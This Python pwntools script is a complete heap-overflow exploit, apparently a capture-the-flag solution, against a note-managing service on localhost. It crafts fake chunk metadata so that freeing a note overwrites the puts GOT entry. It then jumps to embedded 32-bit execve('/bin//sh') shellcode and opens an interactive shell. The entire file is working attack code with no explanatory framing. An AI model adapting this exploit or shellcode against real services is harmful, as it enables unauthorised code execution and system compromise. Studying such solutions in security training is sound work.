#!/usr/bin/env python

from pwn import *

DEBUG = False

def r(p, msg):
  response = p.recvuntil(msg)
  if DEBUG:
    log.info(response)
  return response

def add_note(p, size):
  r(p, "option.")
  p.sendline("1")

  r(p, "size.")
  p.sendline(str(size))

def remove_note(p, idx):
  r(p, "option.")
  p.sendline("2")

  r(p, "id.")
  p.sendline(str(idx))

def change_note(p, idx, size, data):
  r(p, "option.")
  p.sendline("3")

  r(p, "id.")
  p.sendline(str(idx))

  r(p, "size.")
  p.sendline(str(size))

  r(p, "data.")
  p.sendline(data)

shellcode = "\xeb\x06"
shellcode += "\x90" * 6
shellcode += ("\x31\xc0\x50\x68\x2f\x2f\x73"
              "\x68\x68\x2f\x62\x69\x6e\x89"
              "\xe3\x89\xc1\x89\xc2\xb0\x0b"
              "\xcd\x80")

puts_got = 0x804a008

pad = lambda x: x + 12 - (x + 12) % 12

size = 128
overflow_size = pad(size) + 8

p = remote("localhost", 8048)

add_note(p, 128)
add_note(p, 128)
add_note(p, 128)

payload = "A" * pad(size)
payload += p32((pad(size) + 12) | 1)        # size + in_use flag
payload += p32(puts_got - 8)

payload2 = "A" * pad(size)
payload2 += shellcode

change_note(p, 1, overflow_size, payload)
change_note(p, 0, overflow_size + len(shellcode), payload2)

remove_note(p, 2)

p.interactive()

p.close()
